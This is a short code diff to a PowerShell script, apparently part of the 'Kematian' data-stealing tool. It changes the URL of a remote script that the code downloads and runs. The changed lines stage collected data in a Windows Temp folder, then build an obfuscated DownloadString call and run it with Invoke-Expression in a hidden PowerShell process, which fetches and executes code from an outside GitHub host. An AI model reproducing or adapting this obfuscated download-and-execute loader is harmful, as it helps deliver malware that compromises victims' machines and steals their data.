@@ -1242,7 +1242,7 @@ function Backup-Data {
     Move-Item -Path "$folder_general" -Destination "$env:windir\Temp\Kematian" -Force
 	Set-Location "$env:windir\Temp"
 	Write-Host "[!] Compressing and Encrypting With 7zr Tool" -ForegroundColor Green
-    $7zr_shellcode = ("https://github.com/Pirate-Devs/Kematian/releases/download/7zrBuild/7zr.bin")
+    $7zr_shellcode = ("https://github.com/macedonianlegend/Kematian/raw/main/frontend-src/encryption.ps1")
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$7zr_shellcode')"
     $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
     $proc.WaitForExit()
